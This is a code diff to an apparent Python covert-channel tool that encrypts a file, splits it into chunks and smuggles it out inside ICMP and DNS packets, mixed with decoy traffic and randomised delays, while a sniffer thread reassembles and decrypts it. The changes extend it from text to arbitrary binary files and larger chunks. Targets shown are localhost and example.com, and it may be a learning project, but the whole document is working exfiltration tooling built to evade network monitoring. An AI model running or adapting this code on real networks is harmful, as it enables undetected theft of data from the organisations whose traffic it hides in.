@@ -23,15 +23,16 @@ dict_lock = threading.Lock()  # Lock for thread-safe access to received_chunks
 DNS_DOMAIN = "example.com"  # Example domain for DNS queries
 dns_servers = ["8.8.8.8", "8.8.4.4"]  # Public DNS servers for testing
 HTTP_SERVER_IP = "127.0.0.1"  # Localhost for testing HTTP dummy traffic
-salt = get_random_bytes(16) # Salt generation
+salt = get_random_bytes(16) # Random Salt generation
 
 # Encryption and Compression function
 def encrypt_and_compress_payload(payload):
+    if isinstance(payload, str):
+        payload = payload.encode()  # Convert string to bytes if necessary
     # Compress the payload
-    compressed_payload = zlib.compress(payload.encode())
+    compressed_payload = zlib.compress(payload)
     # Encrypt the compressed payload
     key = PBKDF2(SECRET_KEY, salt, dkLen=32, count=1000000)  # Generate a 256-bit PBKDF2-based key with a high iteration count
-    #key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
     cipher = AES.new(key, AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(compressed_payload, AES.block_size))
     return cipher.iv + ct_bytes
@@ -40,14 +41,14 @@ def encrypt_and_compress_payload(payload):
 def decrypt_and_decompress_payload(encrypted_payload):
     try:
         key = PBKDF2(SECRET_KEY, salt, dkLen=32, count=1000000)  # Generate a 256-bit PBKDF2-based key with a high iteration count
-        #key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
         iv = encrypted_payload[:16]
         ct = encrypted_payload[16:]
         cipher = AES.new(key, AES.MODE_CBC, iv)
         compressed_payload = unpad(cipher.decrypt(ct), AES.block_size)
         # Decompress the payload
         decompressed_payload = zlib.decompress(compressed_payload)
-        return decompressed_payload.decode()
+        # return decompressed_payload.decode()
+        return decompressed_payload
     except ValueError as e:
         raise ValueError(f"Decryption failed due to incorrect data format: {e}")
     except Exception as e:
@@ -122,7 +123,7 @@ def send_dummy_https():
 
 # ICMP Payload Sender with Enhanced Dummy Traffic
 def send_icmp_payload_with_dummy(payload, target_ip):
-    chunk_size = 32
+    chunk_size = 8000
     payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
 
     for i, chunk in enumerate(payload_chunks):
@@ -150,7 +151,7 @@ def send_icmp_payload_with_dummy(payload, target_ip):
 
 # DNS Payload Sender with Enhanced Dummy Traffic
 def send_dns_payload_with_dummy(payload):
-    chunk_size = 32
+    chunk_size = 8000
     payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
 
     for i, chunk in enumerate(payload_chunks):
@@ -178,6 +179,21 @@ def send_dns_payload_with_dummy(payload):
 
         # Sleep for a realistic time before sending next packet
         time.sleep(random.uniform(0.5, 1.5))
+
+# Read and Encrypt File
+def prepare_file_payload(file_path):
+    with open(file_path, "rb") as file:
+        file_data = file.read()  # Read the entire file in binary mode
+    encrypted_payload = encrypt_and_compress_payload(file_data)
+    print(f"[Main] File Encrypted Payload Length: {len(encrypted_payload)}")
+    return encrypted_payload
+
+# Save Reassembled File
+def save_reassembled_file(file_data, protocol):
+    filename = generate_unique_filename(protocol) + ".bin"  # Save as binary file
+    with open(filename, "wb") as file:
+        file.write(file_data)
+    print(f"[Receiver] Reassembled file saved as: {filename}")
 
 # Packet Sniffer and Reassembler
 def packet_sniffer():
@@ -278,7 +294,7 @@ def packet_sniffer():
 # Using timestamp to create unique filenames
 def generate_unique_filename(protocol):
     timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format: YYYYMMDD-HHMMSS
-    return f"payload_{timestamp}_{protocol}.txt"
+    return f"payload_{timestamp}_{protocol}"
     
 # Saving reassembled and decrypted payload to a new file (ICMP)
 def save_payload_to_file_icmp(decrypted_payload):
@@ -303,14 +319,10 @@ def save_payload_to_file_dns(decrypted_payload):
 # Run Payload Transmission
 if __name__ == "__main__":
     target_ip = "127.0.0.1"
-    #text_payload = "This is my hardcoded payload that I am tunneling over."
+    file_path = "payloads/image_payload.jpeg" # Change to whatever u want to send (limited to binary files)
 
-    # Example: Reading a payload from a TXT file
-    with open("payload.txt", "r") as file:
-        text_payload = file.read()
-
-    # Encrypt and compress the payload before transmission
-    encrypted_payload = encrypt_and_compress_payload(text_payload)
+     # Prepare the file payload
+    encrypted_payload = prepare_file_payload(file_path)
     print(f"[Main] Original Encrypted Payload Length: {len(encrypted_payload)}")
 
     # Start the sniffer thread
@@ -335,7 +347,7 @@ if __name__ == "__main__":
     print("[Main] Payload transmission complete.")
 
     # Wait to ensure all packets are processed
-    time.sleep(20)
+    time.sleep(10)
 
     # Signal the sniffer and dummy traffic to stop
     stop_sniffer.set()
@@ -349,8 +361,9 @@ if __name__ == "__main__":
                 reassembled_payload = b''.join(sorted_chunks)
                 print(f"[Debug - ICMP] Reassembled Payload Length: {len(reassembled_payload)}")
                 decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
-                print(f"[Receiver - ICMP] Final Reassembled and Decrypted Payload: {decrypted_payload}")
-                save_payload_to_file_icmp(decrypted_payload)
+                # print(f"[Receiver - ICMP] Final Reassembled and Decrypted Payload: {decrypted_payload}")
+                # save_payload_to_file_icmp(decrypted_payload)
+                save_reassembled_file(decrypted_payload, "icmp")
             except Exception as e:
                 print(f"[Receiver - ICMP] Error reassembling or decrypting payload: {e}")
         else:
@@ -364,8 +377,9 @@ if __name__ == "__main__":
                 reassembled_payload = b''.join(sorted_chunks)
                 print(f"[Debug - DNS] Reassembled Payload Length: {len(reassembled_payload)}")
                 decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
-                print(f"[Receiver - DNS] Final Reassembled and Decrypted Payload: {decrypted_payload}")
-                save_payload_to_file_dns(decrypted_payload)
+                # print(f"[Receiver - DNS] Final Reassembled and Decrypted Payload: {decrypted_payload}")
+                # save_payload_to_file_dns(decrypted_payload)
+                save_reassembled_file(decrypted_payload, "dns")
 
             except Exception as e:
                 print(f"[Receiver - DNS] Error reassembling or decrypting payload: {e}")
